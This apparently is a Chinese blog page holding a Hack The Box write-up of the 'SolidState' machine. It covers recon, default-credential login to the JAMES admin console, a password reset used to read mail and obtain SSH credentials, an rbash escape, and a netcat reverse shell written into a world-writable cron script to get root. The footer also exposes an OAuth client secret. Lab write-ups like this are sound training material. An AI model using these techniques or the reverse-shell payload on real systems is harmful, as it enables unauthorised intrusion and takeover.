@@ -1,0 +1,761 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
+    
+    
+    
+    
+    <title>SolidState - Hackthebox | Lucifiel&#39;s Blog | Lucifiel 技术博客</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="Hackthebox">
+    <meta name="description" content="Hackthebox - SolidState靶场信息  靶场类型  信息收集Nmap┌──(root㉿lucifiel)-[~&#x2F;Desktop] └─# nmap -sS -sC -sV -A -p- --min-rate 5000 10.10.10.51 Starting Nmap 7.92 ( https:&#x2F;&#x2F;nmap.org ) at 2022-07-11 09:27 CST Nmap s">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SolidState - Hackthebox">
+<meta property="og:url" content="http://www.lucifiel.com/2022/07/11/Hackthebox/Medium/Hackthebox-SolidState/index.html">
+<meta property="og:site_name" content="Lucifiel&#39;s Blog">
+<meta property="og:description" content="Hackthebox - SolidState靶场信息  靶场类型  信息收集Nmap┌──(root㉿lucifiel)-[~&#x2F;Desktop] └─# nmap -sS -sC -sV -A -p- --min-rate 5000 10.10.10.51 Starting Nmap 7.92 ( https:&#x2F;&#x2F;nmap.org ) at 2022-07-11 09:27 CST Nmap s">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://www.lucifiel.com/2022/07/11/Hackthebox/Medium/Hackthebox-SolidState/4c71c978-a696-4953-a7f3-e15854c05553.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/07/11/Hackthebox/Medium/Hackthebox-SolidState/f951eea4-6c8a-44c6-85ad-b1aa4651162d.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/07/11/Hackthebox/Medium/Hackthebox-SolidState/1890dda5-91e3-4ae1-a5d8-24dbc717743d.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/07/11/Hackthebox/Medium/Hackthebox-SolidState/cbf1f061-20d1-4023-8a92-15bd5dcb782d.png">
+<meta property="article:published_time" content="2022-07-11T11:38:36.000Z">
+<meta property="article:modified_time" content="2023-06-13T03:52:35.998Z">
+<meta property="article:author" content="Lucifiel">
+<meta property="article:tag" content="Hackthebox">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://www.lucifiel.com/2022/07/11/Hackthebox/Medium/Hackthebox-SolidState/4c71c978-a696-4953-a7f3-e15854c05553.png">
+    
+        <link rel="alternate" type="application/atom+xml" title="Lucifiel&#39;s Blog" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+<meta name="generator" content="Hexo 4.2.1"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>
+
+<body>
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">Lucifiel</h5>
+          <a href="mailto:LucifielHack@qq.com" title="LucifielHack@qq.com" class="mail">LucifielHack@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                Tags
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                Categories
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/LucifielHack" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/about"  >
+                <i class="icon icon-lg icon-user"></i>
+                About
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">SolidState - Hackthebox</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">SolidState - Hackthebox</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2022-07-11T11:38:36.000Z" itemprop="datePublished" class="page-time">
+  2022-07-11
+</time>
+
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Hackthebox-SolidState"><span class="post-toc-text">Hackthebox - SolidState</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#靶场信息"><span class="post-toc-text">靶场信息</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#靶场类型"><span class="post-toc-text">靶场类型</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#信息收集"><span class="post-toc-text">信息收集</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Nmap"><span class="post-toc-text">Nmap</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Http"><span class="post-toc-text">Http</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#4555-端口"><span class="post-toc-text">4555 端口</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#漏洞利用"><span class="post-toc-text">漏洞利用</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#权限提升"><span class="post-toc-text">权限提升</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#rbash-逃逸"><span class="post-toc-text">rbash 逃逸</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Root"><span class="post-toc-text">Root</span></a></li></ol></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-Hackthebox/Medium/Hackthebox-SolidState"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">SolidState - Hackthebox</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2022-07-11 19:38:36" datetime="2022-07-11T11:38:36.000Z"  itemprop="datePublished">2022-07-11</time>
+
+            
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <h1 id="Hackthebox-SolidState"><a href="#Hackthebox-SolidState" class="headerlink" title="Hackthebox - SolidState"></a>Hackthebox - SolidState</h1><h1 id="靶场信息"><a href="#靶场信息" class="headerlink" title="靶场信息"></a>靶场信息</h1><img src="/2022/07/11/Hackthebox/Medium/Hackthebox-SolidState/4c71c978-a696-4953-a7f3-e15854c05553.png" class>
+
+<h1 id="靶场类型"><a href="#靶场类型" class="headerlink" title="靶场类型"></a>靶场类型</h1><img src="/2022/07/11/Hackthebox/Medium/Hackthebox-SolidState/f951eea4-6c8a-44c6-85ad-b1aa4651162d.png" class>
+
+<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><pre><code class="bash">┌──(root㉿lucifiel)-[~/Desktop]
+└─# nmap -sS -sC -sV -A -p- --min-rate 5000 10.10.10.51
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-11 09:27 CST
+Nmap scan report for 10.10.10.51
+Host is up (0.38s latency).
+Not shown: 65529 closed tcp ports (reset)
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)
+|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)
+|_  256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519)
+25/tcp   open  smtp    JAMES smtpd 2.3.2
+|_smtp-commands: solidstate Hello nmap.scanme.org (10.10.14.19 [10.10.14.19]), PIPELINING, ENHANCEDSTATUSCODES
+80/tcp   open  http    Apache httpd 2.4.25 ((Debian))
+|_http-title: Home - Solid State Security
+|_http-server-header: Apache/2.4.25 (Debian)
+110/tcp  open  pop3    JAMES pop3d 2.3.2
+|_tls-alpn: ERROR: Script execution failed (use -d to debug)
+|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
+|_sslv2: ERROR: Script execution failed (use -d to debug)
+|_ssl-date: ERROR: Script execution failed (use -d to debug)
+|_ssl-cert: ERROR: Script execution failed (use -d to debug)
+119/tcp  open  nntp?
+|_sslv2: ERROR: Script execution failed (use -d to debug)
+|_ssl-cert: ERROR: Script execution failed (use -d to debug)
+|_tls-alpn: ERROR: Script execution failed (use -d to debug)
+|_ssl-date: ERROR: Script execution failed (use -d to debug)
+|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
+4555/tcp open  rsip?
+| fingerprint-strings: 
+|   GenericLines: 
+|     JAMES Remote Administration Tool 2.3.2
+|     Please enter your login and password
+|     Login id:
+|     Password:
+|     Login failed for 
+|_    Login id:
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port4555-TCP:V=7.92%I=7%D=7/11%Time=62CB7C97%P=aarch64-unknown-linux-gn
+SF:u%r(GenericLines,7C,&quot;JAMES\x20Remote\x20Administration\x20Tool\x202\.3\
+SF:.2\nPlease\x20enter\x20your\x20login\x20and\x20password\nLogin\x20id:\n
+SF:Password:\nLogin\x20failed\x20for\x20\nLogin\x20id:\n&quot;);
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.92%E=4%D=7/11%OT=22%CT=1%CU=39286%PV=Y%DS=2%DC=T%G=Y%TM=62CB7DA
+OS:6%P=aarch64-unknown-linux-gnu)SEQ(SP=104%GCD=3%ISR=10F%TI=Z%CI=I%TS=8)SE
+OS:Q(SP=104%GCD=1%ISR=10F%TI=Z%CI=I%II=I%TS=8)SEQ(SP=104%GCD=1%ISR=10F%TI=Z
+OS:%II=I%TS=8)OPS(O1=M539ST11NW7%O2=M539ST11NW7%O3=M539NNT11NW7%O4=M539ST11
+OS:NW7%O5=M539ST11NW7%O6=M539ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=71
+OS:20%W6=7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M539NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=4
+OS:0%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O
+OS:=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40
+OS:%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q
+OS:=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y
+OS:%DFI=N%T=40%CD=S)
+
+Network Distance: 2 hops
+Service Info: Host: solidstate; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 1720/tcp)
+HOP RTT       ADDRESS
+1   461.02 ms 10.10.14.1
+2   434.42 ms 10.10.10.51
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 304.88 seconds
+</code></pre>
+<h2 id="Http"><a href="#Http" class="headerlink" title="Http"></a>Http</h2><img src="/2022/07/11/Hackthebox/Medium/Hackthebox-SolidState/1890dda5-91e3-4ae1-a5d8-24dbc717743d.png" class>
+
+<p>这边我 fuzz 和寻找了一下，都没看到什么东西，咱们换个思路</p>
+<h2 id="4555-端口"><a href="#4555-端口" class="headerlink" title="4555 端口"></a>4555 端口</h2><p>这边有一个 4555 端口，这种异常端口一看就不对劲。JAMES Remote Administration Tool 2.3.2，这边扫描端口的时候有提示版本信息，去搜索一下</p>
+<img src="/2022/07/11/Hackthebox/Medium/Hackthebox-SolidState/cbf1f061-20d1-4023-8a92-15bd5dcb782d.png" class>
+
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>得知了这是一个 pop3 协议的邮件服务器，默认账号密码都是 root，去使用 telnet 登陆一下</p>
+<pre><code class="bash">┌──(root㉿lucifiel)-[~/Desktop]
+└─# telnet 10.10.10.51 4555
+Trying 10.10.10.51...
+Connected to 10.10.10.51.
+Escape character is &#39;^]&#39;.
+JAMES Remote Administration Tool 2.3.2
+Please enter your login and password
+Login id:
+root
+Password:
+root
+Welcome root. HELP for a list of commands
+help
+Currently implemented commands:
+help                                    display this help
+listusers                               display existing accounts
+countusers                              display the number of existing accounts
+adduser [username] [password]           add a new user
+verify [username]                       verify if specified user exist
+deluser [username]                      delete existing user
+setpassword [username] [password]       sets a user&#39;s password
+setalias [user] [alias]                 locally forwards all email for &#39;user&#39; to &#39;alias&#39;
+showalias [username]                    shows a user&#39;s current email alias
+unsetalias [user]                       unsets an alias for &#39;user&#39;
+setforwarding [username] [emailaddress] forwards a user&#39;s email to another email address
+showforwarding [username]               shows a user&#39;s current email forwarding
+unsetforwarding [username]              removes a forward
+user [repositoryname]                   change to another user repository
+shutdown                                kills the current JVM (convenient when James is run as a daemon)
+quit                                    close connection
+</code></pre>
+<p>登陆成功，命令中有列账号的功能和重置密码的功能，去看一下</p>
+<pre><code class="bash">Unknown command 
+listusers
+Existing accounts 5
+user: james
+user: thomas
+user: john
+user: mindy
+user: mailadmin
+setpassword mindy admin
+Password for mindy reset
+</code></pre>
+<p>将帐户 mindy 的密码给重置了，然后去 110 端口登陆一下</p>
+<pre><code class="bash">┌──(root㉿lucifiel)-[~/Desktop]
+└─# telnet 10.10.10.51 110 
+Trying 10.10.10.51...
+Connected to 10.10.10.51.
+Escape character is &#39;^]&#39;.
++OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
+user mindy
++OK
+pass admin
++OK Welcome mindy
+list
++OK 2 1945
+1 1109
+2 836
+.
+retr 2
++OK Message follows
+Return-Path: &lt;mailadmin@localhost&gt;
+Message-ID: &lt;16744123.2.1503422270399.JavaMail.root@solidstate&gt;
+MIME-Version: 1.0
+Content-Type: text/plain; charset=us-ascii
+Content-Transfer-Encoding: 7bit
+Delivered-To: mindy@localhost
+Received: from 192.168.11.142 ([192.168.11.142])
+          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
+          for &lt;mindy@localhost&gt;;
+          Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
+Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
+From: mailadmin@localhost
+Subject: Your Access
+
+Dear Mindy,
+
+Here are your ssh credentials to access the system. Remember to reset your password after your first login. 
+Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. 
+
+username: mindy
+pass: P@55W0rd1!2@
+
+Respectfully,
+James
+
+.
+Connection closed by foreign host.
+</code></pre>
+<p>得到了一个账号密码</p>
+<pre><code class="bash">username = mindy
+password = P@55W0rd1!2@
+</code></pre>
+<pre><code class="bash">┌──(root㉿lucifiel)-[~/Desktop]
+└─# ssh mindy@10.10.10.51           
+The authenticity of host &#39;10.10.10.51 (10.10.10.51)&#39; can&#39;t be established.
+ED25519 key fingerprint is SHA256:rC5LxqIPhybBFae7BXE/MWyG4ylXjaZJn6z2/1+GmJg.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added &#39;10.10.10.51&#39; (ED25519) to the list of known hosts.
+mindy@10.10.10.51&#39;s password: 
+Linux solidstate 4.9.0-3-686-pae #1 SMP Debian 4.9.30-2+deb9u3 (2017-08-06) i686
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Tue Aug 22 14:00:02 2017 from 192.168.11.142
+mindy@solidstate:~$ whoami&amp;&amp;id
+-rbash: whoami: command not found
+</code></pre>
+<p>进去了，但没完全进去</p>
+<pre><code class="bash">mindy@solidstate:~$ cat user.txt
+80d14d9b351c71c448bd5500e43c222e
+</code></pre>
+<p>得到了 user 权限的 flag 文件</p>
+<h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h1><h2 id="rbash-逃逸"><a href="#rbash-逃逸" class="headerlink" title="rbash 逃逸"></a>rbash 逃逸</h2><pre><code class="bash">mindy@solidstate:~$ cd
+-rbash: cd: restricted
+</code></pre>
+<p>根据情况看，这是一台受限的 rbash，去想办法逃逸一下</p>
+<blockquote>
+<p><a href="https://xz.aliyun.com/t/7642" target="_blank" rel="noopener">https://xz.aliyun.com/t/7642</a></p>
+</blockquote>
+<p>找到了一篇文章</p>
+<p>使用了其中一个指定 bash 的方法成功逃逸</p>
+<pre><code class="bash">ssh mindy@10.10.10.51 -t &quot;bash --noprofile&quot;
+</code></pre>
+<p>成功逃逸</p>
+<pre><code class="bash">${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ whoami&amp;&amp;id
+mindy
+uid=1001(mindy) gid=1001(mindy) groups=1001(mindy)
+</code></pre>
+<h2 id="Root"><a href="#Root" class="headerlink" title="Root"></a>Root</h2><p>查看一下当前运行的进程</p>
+<pre><code class="bash">${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ ps aux|grep james
+root       556  0.0  0.0   2332   616 ?        Ss   Jul10   0:00 /bin/sh /opt/james-2.3.2/bin/run.sh
+root       575  0.1  3.7 854972 77232 ?        Sl   Jul10   0:19 /usr/lib/jvm/java-8-openjdk-i386//bin/java -Djava.ext.dirs=/opt/james-2.3.2/lib:/opt/james-2.3.2/tools/lib -Djava.security.manager -Djava.security.policy=jar:file:/opt/james-2.3.2/bin/phoenix-loader.jar!/META-INF/java.policy -Dnetworkaddress.cache.ttl=300 -Dphoenix.home=/opt/james-2.3.2 -Djava.io.tmpdir=/opt/james-2.3.2/temp -jar /opt/james-2.3.2/bin/phoenix-loader.jar
+mindy    23970  0.0  0.0   4736   800 pts/0    S+   02:15   0:00 grep james
+</code></pre>
+<p>可以看到，有一个 sh 一直运行着的 run.sh 文件去查看下是啥东西</p>
+<pre><code class="bash">${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ cat /opt/james-2.3.2/bin/run.sh
+#! /bin/sh
+#
+# -----------------------------------------------------------------------------
+# Phoenix start script.
+#
+
+# OS specific support.  $var _must_ be set to either true or false.
+cygwin=false
+case &quot;`uname`&quot; in
+CYGWIN*) cygwin=true;;
+esac
+
+# resolve links - $0 may be a softlink
+THIS_PROG=&quot;$0&quot;
+
+while [ -h &quot;$THIS_PROG&quot; ]; do
+  ls=`ls -ld &quot;$THIS_PROG&quot;`
+  link=`expr &quot;$ls&quot; : &#39;.*-&gt; \(.*\)$&#39;`
+  if expr &quot;$link&quot; : &#39;.*/.*&#39; &gt; /dev/null; then
+    THIS_PROG=&quot;$link&quot;
+  else
+    THIS_PROG=`dirname &quot;$THIS_PROG&quot;`/&quot;$link&quot;
+  fi
+done
+
+# Get standard environment variables
+PRGDIR=`dirname &quot;$THIS_PROG&quot;`
+PHOENIX_HOME=`cd &quot;$PRGDIR/..&quot; ; pwd`
+
+unset THIS_PROG
+
+# For Cygwin, ensure paths are in UNIX format before anything is touched
+if $cygwin; then
+  [ -n &quot;$PHOENIX_HOME&quot; ] &amp;&amp; PHOENIX_HOME=`cygpath --unix &quot;$PHOENIX_HOME&quot;`
+fi
+
+$PHOENIX_HOME/bin/phoenix.sh run $*
+</code></pre>
+<p>没看到啥有用的东西</p>
+<p>但是可以确定的是肯定和 opt 目录下的东西有关，咱们去看看</p>
+<pre><code class="bash">${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$ ls -la
+total 16
+drwxr-xr-x  3 root root 4096 Aug 22  2017 .
+drwxr-xr-x 22 root root 4096 May 27 11:05 ..
+drwxr-xr-x 11 root root 4096 Apr 26  2021 james-2.3.2
+-rwxrwxrwx  1 root root  105 Aug 22  2017 tmp.py
+</code></pre>
+<p>这边有点异常，在 &#x2F;opt 目录下发现一个 tmp.py 的文件，权限是 777 的</p>
+<pre><code class="bash">${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$ cat tmp.py 
+#!/usr/bin/env python
+import os
+import sys
+try:
+     os.system(&#39;rm -r /tmp/* &#39;)
+except:
+     sys.exit()
+</code></pre>
+<p>这边看着像是个实时运行的脚本，尝试写入反弹 shell 的东西</p>
+<pre><code class="bash">echo &quot;import os;os.system(&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.19 4444 &gt;/tmp/f&#39;)&quot; &gt; /opt/tmp.py
+</code></pre>
+<p>然后使用 nc 监听一个端口</p>
+<pre><code class="bash">┌──(root㉿lucifiel)-[~/Desktop]
+└─# nc -nvlp 4444                                      
+listening on [any] 4444 ...
+connect to [10.10.14.19] from (UNKNOWN) [10.10.10.51] 37764
+/bin/sh: 0: can&#39;t access tty; job control turned off
+# whoami&amp;&amp;id
+root
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre>
+<p>成功拿到 root 权限</p>
+<pre><code class="bash"># cat /root/root.txt
+096c5f57afdfe824d5827ea17af7756c
+</code></pre>
+<p>成功拿到 root 权限的 flag 文件</p>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <footer>
+        <a href="http://www.lucifiel.com">
+            <img src="/img/avatar.jpg" alt="Lucifiel">
+            Lucifiel
+        </a>
+    </footer>
+</blockquote>
+
+        
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Hackthebox/" rel="tag">Hackthebox</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2022/07/11/Hackthebox/Medium/Hackthebox-SolidState/&title=《SolidState - Hackthebox》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2022/07/11/Hackthebox/Medium/Hackthebox-SolidState/&title=《SolidState - Hackthebox》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2022/07/11/Hackthebox/Medium/Hackthebox-SolidState/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《SolidState - Hackthebox》 — Lucifiel's Blog&url=http://www.lucifiel.com/2022/07/11/Hackthebox/Medium/Hackthebox-SolidState/&via=http://www.lucifiel.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2022/07/11/Hackthebox/Medium/Hackthebox-SolidState/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2022/07/14/Hackthebox/Medium/Hackthebox-Cronos/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">Cronos - Hackthebox</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2022/07/08/Hackthebox/Medium/Hackthebox-Nineveh/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">Nineveh - Hackthebox</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<section class="comments" id="comments">
+    <div id="gitalk-container"></div>
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+        var id = location.pathname
+        if (location.pathname.length > 50) {
+          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
+        }
+        const gitalk = new Gitalk({
+          clientID: 'cf0a9809323df14a9168',
+          clientSecret: 'a30d7a21bf6d88b7ad5c1f5d1bfc45881c49b2ed',
+          repo: 'LucifielHack.github.io',
+          owner: 'LucifielHack',
+          admin: ['LucifielHack'],
+          id: id,      // Ensure uniqueness and length less than 50
+          title: document.title.split('|')[0],
+          distractionFreeMode: false  // Facebook-like distraction free mode
+        })
+
+        gitalk.render('gitalk-container')
+    </script>
+</section>
+
+
+
+
+</article>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            <!--- 
+                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
+            
+            <span>footer.license</span> --->
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>Lucifiel &copy; 2020 - 2023</span>
+            <span>
+                
+                Power by Lucifiel</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2022/07/11/Hackthebox/Medium/Hackthebox-SolidState/&title=《SolidState - Hackthebox》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2022/07/11/Hackthebox/Medium/Hackthebox-SolidState/&title=《SolidState - Hackthebox》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2022/07/11/Hackthebox/Medium/Hackthebox-SolidState/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
